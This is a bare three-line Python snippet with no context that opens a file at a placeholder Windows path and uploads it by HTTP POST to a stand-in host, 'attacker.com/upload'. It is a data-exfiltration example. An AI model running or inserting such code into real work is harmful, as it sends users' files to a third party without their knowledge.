import requests
with open('C:\\path\\to\\file.txt', 'rb') as f:
    requests.post('http://attacker.com/upload', files={'file': f})